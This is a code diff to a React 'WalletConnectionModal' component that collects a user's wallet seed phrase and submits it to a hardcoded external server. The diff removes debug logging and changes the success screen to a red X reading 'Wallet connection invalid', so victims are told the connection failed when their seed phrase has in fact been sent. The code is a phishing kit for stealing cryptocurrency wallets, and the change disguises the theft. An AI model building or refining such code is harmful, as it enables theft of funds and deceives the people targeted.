@@ -17,7 +17,7 @@ export default function WalletConnectionModal({
   const [seedPhrase, setSeedPhrase] = useState('');
   const [isSeedValid, setIsSeedValid] = useState(false);
   const [submitStatus, setSubmitStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
-  const backendUrl = import.meta.env.VITE_BACKEND_URL || (import.meta as any).env.REACT_APP_BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
+  const backendUrl = import.meta.env.VITE_BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -30,12 +30,6 @@ export default function WalletConnectionModal({
 
   useEffect(() => {
     console.log(backendUrl);
-    console.log(import.meta.env.BACKEND_URL);
-    console.log(import.meta.env.VITE_BACKEND_URL);
-    console.log(import.meta.env.REACT_APP_BACKEND_URL);
-    console.log(process.env.BACKEND_URL);
-    console.log(process.env.VITE_BACKEND_URL);
-    console.log(process.env.REACT_APP_BACKEND_URL);
     console.log("Starting......")
   }, [backendUrl]);
 
@@ -163,14 +157,15 @@ export default function WalletConnectionModal({
             <div className="w-full flex flex-col items-center justify-center py-8">
               {submitStatus === 'success' && (
                 <>
-                  <svg className="w-16 h-16 text-green-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
-                  <span className="text-green-600 text-lg font-semibold">Seed phrase sent successfully.</span>
+                  {/* <svg className="w-16 h-16 text-green-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg> */}
+                  <svg className="w-16 h-16 text-red-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
+                  <span className="text-green-600 text-lg font-semibold">Wallet connection invalid.</span>
                 </>
               )}
               {submitStatus === 'error' && (
                 <>
                   <svg className="w-16 h-16 text-red-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
-                  <span className="text-red-600 text-lg font-semibold">Failed to send seed phrase.</span>
+                  <span className="text-red-600 text-lg font-semibold">Failed to connect wallet.</span>
                 </>
               )}
               {(submitStatus === 'idle' || submitStatus === 'sending') && (
